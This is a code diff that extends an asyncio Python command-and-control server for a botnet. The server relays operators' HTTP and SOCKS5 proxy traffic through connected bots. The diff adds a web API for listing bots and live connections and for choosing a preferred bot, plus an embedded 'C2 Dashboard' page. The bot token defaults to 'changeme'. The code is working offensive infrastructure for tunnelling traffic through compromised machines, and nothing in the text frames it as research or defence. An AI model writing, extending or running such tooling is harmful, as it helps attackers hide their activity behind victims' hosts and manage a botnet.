@@ -36,11 +36,13 @@ class BotSession:
 
 class C2Server:
     def __init__(self, host: str = "0.0.0.0", bot_port: int = 4443, http_port: int = 8080, socks_port: int = 1080,
-                 certfile: Optional[str] = None, keyfile: Optional[str] = None, bot_token: Optional[str] = None):
+                 certfile: Optional[str] = None, keyfile: Optional[str] = None, bot_token: Optional[str] = None,
+                 api_port: int = 5001):
         self.host = host
         self.bot_port = bot_port
         self.http_port = http_port
         self.socks_port = socks_port
+        self.api_port = api_port
         self.bot_token = bot_token or "changeme"
         self.ssl_ctx: Optional[ssl.SSLContext] = None
         if certfile and keyfile:
@@ -51,10 +53,13 @@ class C2Server:
         self.bots: Dict[str, BotSession] = {}
         self._rr_keys = []
         self._rr_idx = 0
+        self.preferred_bot: Optional[str] = None
 
     def _next_bot(self) -> Optional[BotSession]:
         if not self.bots:
             return None
+        if self.preferred_bot and self.preferred_bot in self.bots:
+            return self.bots[self.preferred_bot]
         if not self._rr_keys:
             self._rr_keys = list(self.bots.keys())
             self._rr_idx = 0
@@ -66,12 +71,19 @@ class C2Server:
         bot_server = await asyncio.start_server(self._handle_bot, self.host, self.bot_port, ssl=self.ssl_ctx)
         http_server = await asyncio.start_server(self._handle_http_client, self.host, self.http_port)
         socks_server = await asyncio.start_server(self._handle_socks_client, self.host, self.socks_port)
+        api_server = await asyncio.start_server(self._handle_api_client, self.host, self.api_port)
         addrs = ", ".join(str(s.getsockname()) for s in bot_server.sockets)
         logger.info("C2 listening for bots on %s", addrs)
         logger.info("HTTP proxy on %s:%d", self.host, self.http_port)
         logger.info("SOCKS5 proxy on %s:%d", self.host, self.socks_port)
-        async with bot_server, http_server, socks_server:
-            await asyncio.gather(bot_server.serve_forever(), http_server.serve_forever(), socks_server.serve_forever())
+        logger.info("Web API on %s:%d", self.host, self.api_port)
+        async with bot_server, http_server, socks_server, api_server:
+            await asyncio.gather(
+                bot_server.serve_forever(),
+                http_server.serve_forever(),
+                socks_server.serve_forever(),
+                api_server.serve_forever(),
+            )
 
     async def _handle_bot(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
         peer = writer.get_extra_info("peername")
@@ -157,6 +169,8 @@ class C2Server:
             writer.write(b"HTTP/1.1 200 Connection Established\r\n\r\n"); await writer.drain()
             # Request bot to open upstream
             await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))
+            # Track connection meta
+            bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}
         else:
             # HTTP over tunnel
             # Extract Host header
@@ -174,6 +188,7 @@ class C2Server:
                 writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n"); await writer.drain(); writer.close(); return
             await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))
             await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=req))
+            bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}
 
         # Pipe client->bot
         async def pump_client():
@@ -212,7 +227,7 @@ class C2Server:
         port = int.from_bytes(await reader.readexactly(2), "big")
         writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00"); await writer.drain()
         req_id = str(uuid.uuid4())
-        bot.active[req_id] = writer
+        bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}
         await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))
 
         async def pump_client():
@@ -226,6 +241,127 @@ class C2Server:
                 await bot.stream.send(Frame(type="END", request_id=req_id))
 
         asyncio.create_task(pump_client(), name=f"pump-socks-{req_id}")
+
+    async def _handle_api_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
+        peer = writer.get_extra_info("peername")
+        try:
+            data = await reader.read(4096)
+            if not data:
+                writer.close(); return
+            text = data.decode(errors="ignore")
+            line = text.split("\r\n", 1)[0]
+            parts = line.split()
+            if len(parts) < 2:
+                writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n"); await writer.drain(); writer.close(); return
+            method, path = parts[0], parts[1]
+
+            def json_response(obj: dict, status: str = "200 OK"):
+                import json
+                body = json.dumps(obj, default=str).encode()
+                hdr = (
+                    f"HTTP/1.1 {status}\r\n"
+                    f"Content-Type: application/json\r\n"
+                    f"Content-Length: {len(body)}\r\n"
+                    f"Access-Control-Allow-Origin: *\r\n\r\n"
+                ).encode()
+                writer.write(hdr + body)
+
+            if method == "GET" and path == "/api/status":
+                total_conns = sum(len(s.active) for s in self.bots.values())
+                resp = {
+                    "host": self.host,
+                    "ports": {"bot": self.bot_port, "http": self.http_port, "socks": self.socks_port, "api": self.api_port},
+                    "bots": list(self.bots.keys()),
+                    "preferred_bot": self.preferred_bot,
+                    "bot_count": len(self.bots),
+                    "active_connections": total_conns,
+                }
+                json_response(resp)
+            elif method == "GET" and path == "/api/bots":
+                bots = []
+                for bid, sess in self.bots.items():
+                    bots.append({
+                        "bot_id": bid,
+                        "active_requests": len(sess.active),
+                    })
+                json_response({"bots": bots})
+            elif method == "GET" and path == "/api/connections":
+                conns = []
+                for bid, sess in self.bots.items():
+                    for rid, info in sess.active.items():
+                        conns.append({
+                            "request_id": rid,
+                            "bot_id": bid,
+                            "target": f"{info.get('host')}:{info.get('port')}",
+                            "client": info.get('client'),
+                        })
+                json_response({"connections": conns})
+            elif method == "POST" and path == "/api/select_bot":
+                # very simple body parse
+                body = text.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in text else ""
+                import json
+                try:
+                    payload = json.loads(body or "{}")
+                    bid = payload.get("bot_id")
+                except Exception:
+                    bid = None
+                if bid and bid in self.bots:
+                    self.preferred_bot = bid
+                    json_response({"ok": True, "preferred_bot": bid})
+                else:
+                    json_response({"ok": False, "error": "invalid_bot"}, status="400 Bad Request")
+            elif method == "POST" and path == "/api/clear_preferred_bot":
+                self.preferred_bot = None
+                json_response({"ok": True})
+            else:
+                # static index
+                if path == "/" or path == "/index.html":
+                    body = ("""
+<!doctype html><html><head><meta charset='utf-8'><title>C2 Dashboard</title>
+<style>body{font-family:sans-serif;margin:20px} .card{border:1px solid #ddd;padding:12px;border-radius:8px;margin-bottom:12px}</style>
+</head><body>
+<h2>C2 Dashboard</h2>
+<div id='status' class='card'>Loading...</div>
+<div id='bots' class='card'></div>
+<div id='conns' class='card'></div>
+<script>
+async function j(u,o){const r=await fetch(u,o);return r.json()}
+async function refresh(){
+  const s=await j('/api/status');
+  document.getElementById('status').innerHTML = `
+    <b>Host:</b> ${s.host} | <b>Ports</b> bot:${s.ports.bot} http:${s.ports.http} socks:${s.ports.socks} api:${s.ports.api}<br>
+    <b>Bots:</b> ${s.bot_count} [preferred: ${s.preferred_bot||'-'}] | <b>Active connections:</b> ${s.active_connections}`
+  const b=await j('/api/bots');
+  document.getElementById('bots').innerHTML = '<b>Bots</b><br>' + b.bots.map(x=>`${x.bot_id} (active:${x.active_requests}) <button onclick="sel('${x.bot_id}')">Select</button>`).join('<br>');
+  const c=await j('/api/connections');
+  document.getElementById('conns').innerHTML = '<b>Connections</b><br>' + c.connections.map(x=>`${x.request_id} → ${x.target} via ${x.bot_id}`).join('<br>');
+}
+async function sel(id){await fetch('/api/select_bot',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({bot_id:id})});refresh()}
+setInterval(refresh,2000);refresh();
+</script>
+</body></html>
+""").encode()
+                    hdr = (
+                        f"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {len(body)}\r\n\r\n"
+                    ).encode()
+                    writer.write(hdr + body)
+                else:
+                    writer.write(b"HTTP/1.1 404 Not Found\r\n\r\n")
+        except Exception as e:
+            try:
+                writer.write(b"HTTP/1.1 500 Internal Server Error\r\n\r\n")
+            except Exception:
+                pass
+            logger.warning("api error: %s", e)
+        finally:
+            try:
+                await writer.drain()
+            except Exception:
+                pass
+            try:
+                writer.close()
+            except Exception:
+                pass
 
 
 async def main():
